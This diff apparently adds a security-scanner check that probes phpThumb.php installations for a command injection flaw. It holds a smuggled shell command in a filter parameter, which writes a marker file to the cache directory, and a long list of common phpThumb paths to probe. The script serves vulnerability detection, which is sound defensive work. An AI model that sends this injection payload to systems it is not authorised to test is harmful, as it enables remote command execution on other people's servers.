@@ -1,0 +1,103 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// files to be tested
+var files = new Array();
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testVulnOnURI(uri)
+{
+	lastJob1 = new THTTPJob();
+	lastJob1.verb = "GET";
+	lastJob1.url  = scanURL;	
+	lastJob1.uri  = uri + "?src=./index.php&fltr[]=blur|5;echo+082119f75623eb7abd7bf357698ff66c>cache/acunetix;";		
+	lastJob1.execute();
+	
+	if (!lastJob1.wasError && !lastJob1.notFound && lastJob1.responseStatus == 200) 
+	{
+    	lastJob = new THTTPJob();
+    	lastJob.verb = "GET";
+    	lastJob.url  = scanURL;	
+    	lastJob.uri  = uri.replace("phpThumb.php", "") + "cache/acunetix";		
+    	lastJob.execute();
+    	
+    	if (!lastJob.wasError && !lastJob.notFound && lastJob.responseStatus == 200 && lastJob.response.body.indexOf("082119f75623eb7abd7bf357698ff66c") != -1) 
+    	{
+            alert(uri, 'phpThumb_Command_Injection.xml', lastJob1);
+			return true;				
+        }            
+	}
+	
+	return false;
+}
+/***********************************************************************************/
+function prepareFilesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){	
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && sf.scanSiteFile)
+		{
+			fileName = sf.fullPath;
+			if (sf.Name == "phpThumb.php" && files.length < 5) 
+			{
+				files.push(fileName);
+			}
+		}	
+	}	
+    
+    var tested_common_dirs = getGlobalValue("phpThumb_tested_common_dirs");
+    if (!tested_common_dirs)
+    {
+	    SetGlobalValue("phpThumb_tested_common_dirs", 1, true);
+        
+        files.push("/cms/plugins/content/jthumbs/includes/phpThumb.php");
+        files.push("/common/scripts/phpThumb/phpThumb.php");
+        files.push("/phpThumb/phpThumb.php");
+        files.push("/libs/phpThumb/phpThumb.php");
+        files.push("/gallery/phpThumb/phpThumb.php");
+        files.push("/js/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php");
+        files.push("/mambots/editors/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php");
+        files.push("/admin/scripts/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php");
+        files.push("/modules/phpThumb/phpThumb.php");
+        files.push("/lib/phpThumb/phpThumb.php");
+        files.push("/manager/phpThumb/phpThumb.php");
+        files.push("/thumb/phpThumb.php");
+        files.push("/global/phpthumb/phpThumb.php");
+        files.push("/components/com_hotornot2/phpthumb/phpThumb.php");
+        files.push("/staticfiles/phpThumb/phpThumb.php");
+        files.push("/content/phpthumb/phpthumb.php");
+        files.push("/common/phpthumb/phpThumb.php");
+        files.push("/class/phpthumb/phpThumb.php");
+        files.push("/admin/phpThumb/phpThumb.php");
+        files.push("/phpThumb.php");
+        files.push("/admin/upload/phpThumb.php");
+        files.push("/assets/components/phpthumb/phpThumb.php");
+        files.push("/components/com_alphacontent/assets/phpthumb/phpThumb.php");
+        files.push("/components/com_hotornot2/phpthumb/phpThumb.php");
+        files.push("/components/com_alphauserpoints/assets/phpThumb/phpThumb.php");
+        files.push("/components/com_flexicontent/librairies/phpthumb/phpThumb.php");
+        files.push("/admin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php");
+        files.push("/zadmin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php");
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareFilesToBeTested(list);
+if (files.length > 0) 
+{
+	for (var i=0; i<files.length; i++)
+		testVulnOnURI(files[i]);
+}
